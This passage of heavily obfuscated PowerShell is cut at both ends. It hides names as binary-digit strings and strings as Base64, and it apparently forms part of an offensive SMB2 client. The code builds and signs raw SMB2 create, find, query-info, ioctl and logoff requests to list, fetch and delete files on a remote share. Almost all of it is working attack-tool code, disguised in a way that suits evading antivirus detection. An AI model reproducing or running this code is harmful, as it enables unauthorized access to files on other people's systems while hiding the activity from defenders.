                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEkAbgBmAG8AUgBlAHEAdQBlAHMAdAA=')))
                                }
                            }
                        }
                        elseif(${00011110100011000})
                        {
                            ${01111100001000010} = ${00011101010001010}[132..147]
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                        }
                        elseif(${10011111011100111}.Count -gt 0 -or ${01010110011000111} -eq 1)
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABSAGUAcQB1AGUAcwB0AA==')))
                        }
                        else
                        {
                            ${01101110101010111} = 0x70,0x00,0x00,0x00
                            ${10100110010111111} = 0x02
                            ${00000110110010011} = 0x01
                            ${10000100010001101} = 0x58,0x00,0x00,0x00
                            ${10110110111101000} = 0x00,0x00
                            ${01100011101101010} = 8
                            ${01100110011000011} = 0x02
                            ${00111110000111110} = 0x05
                            ${10000011101011001} = 0x50,0x00,0x00,0x00
                            ${10000011000110000} = 0x00,0x00
                            ${10011000110010111} = 1
                            ${01111100001000010} = ${00011101010001010}[132..147]
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEkAbgBmAG8AUgBlAHEAdQBlAHMAdAA=')))
                            if(${10000110000000001})
                            {
                                ${00011110100011000} = $true
                            }
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdABGAGkAbgBkAFIAZQBxAHUAZQBzAHQA')))
                    {
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x05,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${01010110011011101} = _00011110111010101 ${00000100001111000} 1
                        ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwA=')))] = 0x81,0x00,0x10,0x00
                        ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA==')))] = 0x07,0x00,0x00,0x00
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101}
                        ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHgAdABDAG8AbQBtAGEAbgBkAA==')))] = [System.BitConverter]::GetBytes(${01101111100110010}.Length + ${00111011000011000}.Length)
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000}  
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${01101111101011000}++
                        ${00100000001100011} = _01000000100101100 0x0e,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${00100000001100011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHgAdABDAG8AbQBtAGEAbgBkAA==')))] = 0x68,0x00,0x00,0x00
                        if(${00011001101011011})
                        {
                            ${00100000001100011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            ${00100000001100011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x04,0x00,0x00,0x00
                        }
                        ${10111100111010001} = _01010001000011110 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff 0x00,0x00,0x00,0x00,0x00,0x00
                        ${00010010100100010} = _00001101111001010 ${00100000001100011}
                        ${10111010000001000} = _00001101111001010 ${10111100111010001}    
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${00010010100100010} + ${10111010000001000} 
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00100000001100011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${00010010100100010} = _00001101111001010 ${00100000001100011}
                        }
                        ${01101111101011000}++
                        ${00110001011011010} = _01000000100101100 0x0e,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        if(${00011001101011011})
                        {
                            ${00110001011011010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            ${00110001011011010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x04,0x00,0x00,0x00
                        }
                        ${10000110000001001} = _01010001000011110 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
                        ${10000110000001001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAQgB1AGYAZgBlAHIATABlAG4AZwB0AGgA')))] = 0x80,0x00,0x00,0x00
                        ${10110000001100001} = _00001101111001010 ${00110001011011010}
                        ${10101010001110011} = _00001101111001010 ${10000110000001001}    
                        ${10001001100110010} = _01001110110110100 (${01101111100110010}.Length + ${00010010100100010}.Length + ${10110000001100001}.Length)  (${00111011000011000}.Length + ${10111010000001000}.Length + ${10101010001110011}.Length)
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${10110000001100001} + ${10101010001110011} 
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00110001011011010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${10110000001100001} = _00001101111001010 ${00110001011011010}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000} + ${00010010100100010} + ${10111010000001000} + ${10110000001100001} + ${10101010001110011}
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA'))))
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                            ${00000100001111000} = [System.Text.Encoding]::Unicode.GetBytes(${10000110000000001})
                            ${01010110011000111}++
                        }
                        else
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAEQAaQByAGUAYwB0AG8AcgB5AEMAbwBuAHQAZQBuAHQAcwA=')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABSAGUAcQB1AGUAcwB0AA==')))
                    {
                        ${01111100001000010} = ${00011101010001010}[132..147]
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x0e,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHgAdABDAG8AbQBtAGEAbgBkAA==')))] = 0x68,0x00,0x00,0x00
                        ${01010110011011101} = _01010001000011110 ${01111100001000010} 0x00,0x00,0x00,0x00,0x00,0x00
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101}    
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000} 
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${01101111101011000}++
                        ${00100000001100011} = _01000000100101100 0x0e,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        if(${00011001101011011})
                        {
                            ${00100000001100011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            ${00100000001100011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x04,0x00,0x00,0x00
                        }
                        ${10111100111010001} = _01010001000011110 ${01111100001000010}
                        ${10111100111010001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAQgB1AGYAZgBlAHIATABlAG4AZwB0AGgA')))] = 0x80,0x00,0x00,0x00
                        ${00010010100100010} = _00001101111001010 ${00100000001100011}
                        ${10111010000001000} = _00001101111001010 ${10111100111010001}    
                        ${10001001100110010} = _01001110110110100 (${01101111100110010}.Length + ${00010010100100010}.Length)  (${00111011000011000}.Length + ${10111010000001000}.Length)
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${00010010100100010} + ${10111010000001000} 
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00100000001100011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${00010010100100010} = _00001101111001010 ${00100000001100011}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000} + ${00010010100100010} + ${10111010000001000}
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) -and ${01010110011000111} -eq 1)
                        {
                            ${00010000101011001} = [System.BitConverter]::ToString(${00011101010001010})
                            ${00010000101011001} = ${00010000101011001} -replace "-",""
                            ${01100010111000001} = [System.BitConverter]::ToString([System.Text.Encoding]::Unicode.GetBytes(${00010110100000001}))
                            ${01100010111000001} = ${01100010111000001} -replace "-",""
                            ${01000001100101010} = ${00010000101011001}.IndexOf(${01100010111000001}) - 128
                            ${01111100101011001} = [System.BitConverter]::ToUInt32(${00011101010001010}[(${01000001100101010} / 2)..(${01000001100101010} / 2 + 7)],0)
                            ${01010110011000111}++
                            ${11000000100110110} = 1
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                            if(${10000110000000001} -eq ${00000100001111000})
                            {
                                ${00000100001111000} = [System.Text.Encoding]::Unicode.GetBytes(${00000100001111000})
                            }
                            else
                            {
                                ${00000100001111000} = [System.Text.Encoding]::Unicode.GetBytes(${10000110000000001})
                            }
                        }
                        else
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAEQAaQByAGUAYwB0AG8AcgB5AEMAbwBuAHQAZQBuAHQAcwA=')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBvAGMAdABsAFIAZQBxAHUAZQBzAHQA')))
                    {
                        ${10000111101100010} = ${00011101010001010}[40..43]
                        ${01001101110100110} = "\" + ${10011000110000100} + "\" + ${01011010010000111}
                        ${01001011110000111} = [System.Text.Encoding]::Unicode.GetBytes(${01001101110100110}) + 0x00,0x00
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x0b,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${01010110011011101} = _00111010011010011 ${01001011110000111}
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101}    
                        ${10001001100110010} = _01001110110110100 ${01101111100110010}.Length ${00111011000011000}.Length
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000} 
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000}
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        ${10000111101100010} = 0x00,0x00,0x00,0x00
                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                    {
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x02,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${01010110011011101} = _00010110101110000
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101}
                        ${10001001100110010} = _01001110110110100 ${01101111100110010}.Length ${00111011000011000}.Length
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000}
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000}
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAEQAaQByAGUAYwB0AG8AcgB5AEMAbwBuAHQAZQBuAHQAcwA=')))
                    {
                        ${10101110011001001} = New-Object System.Collections.ArrayList
                        ${01001001011110010} = [System.BitConverter]::ToString(${00011101010001010})
                        ${01001001011110010} = ${01001001011110010} -replace "-",""
                        ${01111101011111110} = New-Object System.Collections.ArrayList
                        ${00010000100100101} = New-Object System.Collections.ArrayList
                        ${01000101000001101} = New-Object System.Collections.ArrayList
                        ${10110011001011111} = New-Object System.Collections.ArrayList
                        ${01111011001101110} = New-Object System.Collections.ArrayList
                        if(${10011111011100111}.Count -gt 0)
                        {
                            ${01000101001000010} = 152
                            ${10011111011100111}.RemoveAt(0) > $null
                        }
                        else
                        {
                            ${01000101001000010} = ${01001001011110010}.Substring(10).IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBFADUAMwA0AEQANAAyAA==')))) + 154
                        }
                        do
                        {
                            ${01010001001001001} = [System.BitConverter]::ToUInt32(${00011101010001010}[(${01000101001000010} / 2 + ${00001100101000101})..(${01000101001000010} / 2 + 3 + ${00001100101000101})],0)
                            ${10111001000011101} = [System.BitConverter]::ToUInt32(${00011101010001010}[(${01000101001000010} / 2 + 40 + ${00001100101000101})..(${01000101001000010} / 2 + 47 + ${00001100101000101})],0)
                            ${00111011001100000} = [Convert]::ToString(${00011101010001010}[(${01000101001000010} / 2 + 56 + ${00001100101000101})],2).PadLeft(16,'0')
                            if(${10111001000011101} -eq 0)
                            {
                                ${10111001000011101} = $null
                            }
                            if(${00111011001100000}.Substring(11,1) -eq '1')
                            {
                                ${00001110100010111} = "d"
                            }
                            else
                            {
                                ${00001110100010111} = "-"
                            }
                            if(${00111011001100000}.Substring(10,1) -eq '1')
                            {
                                ${00001110100010111}+= "a"
                            }
                            else
                            {
                                ${00001110100010111}+= "-"
                            }
                            if(${00111011001100000}.Substring(15,1) -eq '1')
                            {
                                ${00001110100010111}+= "r"
                            }
                            else
                            {
                                ${00001110100010111}+= "-"
                            }
                            if(${00111011001100000}.Substring(14,1) -eq '1')
                            {
                                ${00001110100010111}+= "h"
                            }
                            else
                            {
                                ${00001110100010111}+= "-"
                            }
                            if(${00111011001100000}.Substring(13,1) -eq '1')
                            {
                                ${00001110100010111}+= "s"
                            }
                            else
                            {
                                ${00001110100010111}+= "-"
                            }
                            ${00101101000001101} = [Datetime]::FromFileTime([System.BitConverter]::ToInt64(${00011101010001010}[(${01000101001000010} / 2 + 8 + ${00001100101000101})..(${01000101001000010} / 2 + 15 + ${00001100101000101})],0))
                            ${00101101000001101} = Get-Date ${00101101000001101} -format $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQAvAGQALwB5AHkAeQB5ACAAaAA6AG0AbQAgAHQAdAA=')))
                            ${10000011111000110} = [Datetime]::FromFileTime([System.BitConverter]::ToInt64(${00011101010001010}[(${01000101001000010} / 2 + 24 + ${00001100101000101})..(${01000101001000010} / 2 + 31 + ${00001100101000101})],0))
                            ${10000011111000110} = Get-Date ${10000011111000110} -format $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQAvAGQALwB5AHkAeQB5ACAAaAA6AG0AbQAgAHQAdAA=')))
                            ${10001000100010101} = [System.BitConverter]::ToUInt32(${00011101010001010}[(${01000101001000010} / 2 + 60 + ${00001100101000101})..(${01000101001000010} / 2 + 63 + ${00001100101000101})],0)
                            ${01110001001110010} = ${00011101010001010}[(${01000101001000010} / 2 + 104 + ${00001100101000101})..(${01000101001000010} / 2 + 104 + ${00001100101000101} + ${10001000100010101} - 1)]
                            ${00111010000110110} = [System.BitConverter]::ToString(${01110001001110010})
                            ${00111010000110110} = ${00111010000110110} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            if(${00111010000110110}.Length -gt 2)
                            {
                                ${00111010000110110} = ${00111010000110110}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                                ${00110001010011100} = New-Object System.String (${00111010000110110},0,${00111010000110110}.Length)
                            }
                            else
                            {
                                ${00110001010011100} = [String][Char][System.Convert]::ToInt16(${00111010000110110},16)
                            }
                            if(!$Modify)
                            {
                                ${10000011111000110} = ${10000011111000110}.PadLeft(19,0)
                                [String]${10111001000011101} = ${10111001000011101}
                                ${10111001000011101} = ${10111001000011101}.PadLeft(15,0)
                            }
                            if(${00111011001100000}.Substring(11,1) -eq '1')
                            {
                                if(${00110001010011100} -ne '.' -and ${00110001010011100} -ne '..')
                                {
                                    ${10101110011001001}.Add(${01110001001110010}) > $null
                                    ${01111011001101110}.Add(${00110001010011100}) > $null
                                    ${01111101011111110}.Add(${00001110100010111}) > $null
                                    ${10110011001011111}.Add(${10111001000011101}) > $null
                                    ${01000101000001101}.Add(${10000011111000110}) > $null
                                    ${00010000100100101}.Add(${00101101000001101}) > $null
                                }
                            }
                            else
                            {
                                ${01111011001101110}.Add(${00110001010011100}) > $null
                                ${01111101011111110}.Add(${00001110100010111}) > $null
                                ${10110011001011111}.Add(${10111001000011101}) > $null
                                ${01000101000001101}.Add(${10000011111000110}) > $null
                                ${00010000100100101}.Add(${00101101000001101}) > $null
                            }
                            if(${10000110000000001} -and !${00011110100011000})
                            {
                                ${10111010001111101} = ${10000110000000001} + '\'
                            }
                            ${00001100101000101} += ${01010001001001001}
                        }
                        until(${01010001001001001} -eq 0)
                        if(${01111011001101110})
                        {
                            if(${10111010001111101})
                            {
                                ${10010001010111110} = ${00001101001011101} + "\" + ${10111010001111101}.Substring(0,${10111010001111101}.Length - 1)
                            }
                            else
                            {
                                ${10010001010111110} = ${00001101001011101}
                            }
                        }
                        ${01001101010111001} = @()
                        ${10101111111010000} = 0
                        ForEach(${00110111011000111} in ${01111011001101110})
                        {
                            ${10110101000000001} = New-Object PSObject
                            Add-Member -InputObject ${10110101000000001} -MemberType NoteProperty -Name Name -Value (${10010001010111110} + "\" + ${01111011001101110}[${10101111111010000}])
                            Add-Member -InputObject ${10110101000000001} -MemberType NoteProperty -Name Mode -Value ${01111101011111110}[${10101111111010000}]
                            Add-Member -InputObject ${10110101000000001} -MemberType NoteProperty -Name Length -Value ${10110011001011111}[${10101111111010000}]
                            if($Modify)
                            {
                                Add-Member -InputObject ${10110101000000001} -MemberType NoteProperty -Name CreateTime -Value ${00010000100100101}[${10101111111010000}]
                            }
                            Add-Member -InputObject ${10110101000000001} -MemberType NoteProperty -Name LastWriteTime -Value ${01000101000001101}[${10101111111010000}]
                            ${01001101010111001} += ${10110101000000001}
                            ${10101111111010000}++
                        }
                        if(${01001101010111001} -and !$Modify)
                        {
                            if(${01000110111001001})
                            {
                                (${01001101010111001} | ft -Property @{ Name=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAZQA='))); Expression={$_.Mode }; Alignment=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABlAGYAdAA='))); },
                                                                            @{ Name=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA='))); Expression={$_.LastWriteTime }; Alignment=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBpAGcAaAB0AA=='))); },
                                                                            @{ Name=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))); Expression={$_.Length }; Alignment=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBpAGcAaAB0AA=='))); },
                                                                            @{ Name=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))); Expression={$_.Name }; Alignment=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABlAGYAdAA='))); } -AutoSize -HideTableHeaders -Wrap| Out-String).Trim()
                            }
                            else
                            {
                                ${01000110111001001} = $true
                                (${01001101010111001} | ft -Property @{ Name=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAZQA='))); Expression={$_.Mode }; Alignment=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABlAGYAdAA='))); },
                                                                            @{ Name=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA='))); Expression={$_.LastWriteTime }; Alignment=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBpAGcAaAB0AA=='))); },
                                                                            @{ Name=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))); Expression={$_.Length }; Alignment=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBpAGcAaAB0AA=='))); },
                                                                            @{ Name=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))); Expression={$_.Name }; Alignment=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABlAGYAdAA='))); } -AutoSize -Wrap| Out-String).Trim()
                            }
                        }
                        else
                        {
                            ${01001101010111001}
                        }
                        ${10101110011001001}.Reverse() > $null
                        ForEach(${01101000110100010} in ${10101110011001001})
                        {  
                            ${10011111011100111}.Insert(0,(${01100011001101111} + ${01101000110100010})) > $null
                        }
                        ${00001100101000101} = 0
                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEkAbgBmAG8AUgBlAHEAdQBlAHMAdAA=')))
                    {
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x10,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHgAdABDAG8AbQBtAGEAbgBkAA==')))] = ${01101110101010111}
                        ${01010110011011101} = _10100110011100010 ${10100110010111111} ${00000110110010011} ${10000100010001101} ${10110110111101000} ${01111100001000010} ${01100011101101010}
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101}    
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000} 
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${01101111101011000}++
                        ${00100000001100011} = _01000000100101100 0x10,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        if(${00011001101011011})
                        {
                            ${00100000001100011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            ${00100000001100011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x04,0x00,0x00,0x00
                        }
                        ${10111100111010001} = _10100110011100010 ${01100110011000011} ${00111110000111110} ${10000011101011001} ${10000011000110000} ${01111100001000010} ${10011000110010111}
                        ${00010010100100010} = _00001101111001010 ${00100000001100011}
                        ${10111010000001000} = _00001101111001010 ${10111100111010001}
                        ${10001001100110010} = _01001110110110100 (${01101111100110010}.Length + ${00010010100100010}.Length)  (${00111011000011000}.Length + ${10111010000001000}.Length)
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${00010010100100010} + ${10111010000001000} 
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00100000001100011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${00010010100100010} = _00001101111001010 ${00100000001100011}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000} + ${00010010100100010} + ${10111010000001000}
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        if(${00011110100011000})
                        {
                            ${00000100001111000} = [System.Text.Encoding]::Unicode.GetBytes(${10000110000000001})
                            ${01100011001101111} = ${00000100001111000} + 0x5c,0x00
                            ${11000000100110110} = 1
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                        }
                        elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))))
                        {
                            switch(${01010110011000111})
                            {
                                5
                                {
                                    ${10110010001010011} = [System.BitConverter]::ToString(${00011101010001010})
                                    ${10110010001010011} = ${10110010001010011} -replace "-",""
                                    ${00110100011111010} = ${10110010001010011}.Substring(10).IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBFADUAMwA0AEQANAAyAA==')))) + 170
                                    ${10010110011001110} = [System.BitConverter]::ToUInt32(${00011101010001010}[(${00110100011111010} / 2)..(${00110100011111010} / 2 + 8)],0)
                                    ${10110100110111101} = [Math]::Truncate(${10010110011001110} / 65536)
                                    ${00111111111000110} = ${10010110011001110} % 65536
                                    ${00110111110000001} = ${10110100110111101}
                                    if(${00111111111000110} -ne 0)
                                    {
                                        ${00110111110000001}++
                                    }
                                    if(${10010110011001110} -lt 1024)
                                    {
                                        ${01000101011000111} = "" + ${10010110011001110} + "B"
                                    }
                                    elseif(${10010110011001110} -lt 1024000)
                                    {
                                        ${01000101011000111} = "" + (${10010110011001110} / 1024).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAwADAA')))) + "KB"
                                    }
                                    else
                                    {
